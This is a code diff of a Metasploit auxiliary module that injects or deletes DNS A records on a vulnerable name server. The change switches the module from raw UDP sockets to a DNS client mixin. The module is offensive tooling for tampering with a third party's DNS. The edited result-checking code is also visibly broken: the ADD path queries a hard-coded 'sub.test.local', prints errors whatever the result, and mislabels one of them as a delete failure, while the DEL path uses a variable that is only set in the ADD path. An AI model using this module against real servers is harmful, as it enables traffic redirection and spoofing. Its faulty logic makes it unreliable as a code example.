@@ -3,11 +3,13 @@
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 require 'msf/core'
-require 'net/dns'
+require 'msf/core/exploit/dns'
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::Udp
+
+  include Msf::Exploit::Remote::DNS::Client
 
   def initialize
     super(
@@ -33,22 +35,13 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
         [
-            OptString.new('DOMAIN', [true, 'The domain name']),
-            OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
             OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
             OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
         ], self.class)
 
-    register_advanced_options(
-        [
-            Opt::RPORT(53),
-            OptInt.new('TIMEOUT', [false, 'DNS TIMEOUT', 8]),
-            OptInt.new('RETRY', [false, 'Number of times to try to resolve a record if no response is received', 2]),
-            OptInt.new('RETRY_INTERVAL', [false, 'Number of seconds to wait before doing a retry', 2]),
-            OptBool.new('TCP_DNS', [false, 'Run queries over TCP', false])
-        ], self.class)
-
-    deregister_options( 'RHOST', 'RPORT' )
+    deregister_options('DnsClientTcpDns', 'Proxies')
+    datastore['DnsClientTcpDns'] = false
+    datastore['Proxies'] = false
 
   end
 
@@ -127,12 +120,8 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def send_udp
-    datastore['RHOST'] = datastore['NS']
-    datastore['RPORT'] = 53
-    connect_udp
-
-    # Send UDP packet
-    udp_sock.puts(
+    # Send raw UDP packet via resolver
+    client.send_udp(
         # Build DNS query
         build_a_record(
             action.name,
@@ -144,32 +133,24 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     print_status("Sending DNS query payload...")
     send_udp
 
-    # @res = Net::DNS::Resolver.new
-    # @res.retry = datastore['RETRY'].to_i
-    # @res.retry_interval = datastore['RETRY_INTERVAL'].to_i
-    # query = @res.query(datastore['INJECTDOMAIN'], Net::DNS::A)
-    # print_status "#{query.methods}"
-
     case
       when action.name == 'ADD'
-        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
-        # if resolve == datastore['INJECTIP']
-          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
-        # else
-        #   print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable.")
-        # end
+        resolved = client.query('sub.test.local').answer
+        if resolved.any? {|ans| ans.first.address.to_s == datastore['INJECTIP']}
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+        else
+          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable.")
+        end
 
       when action.name == 'DEL'
-        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
-        # if resolve.nil?
+        if resolved.any? {|ans| ans.first.address.to_s == datastore['INJECTIP']}
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+        else
           print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
-        # else
-        #   print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
-        # end
+        end
     end
 
   end
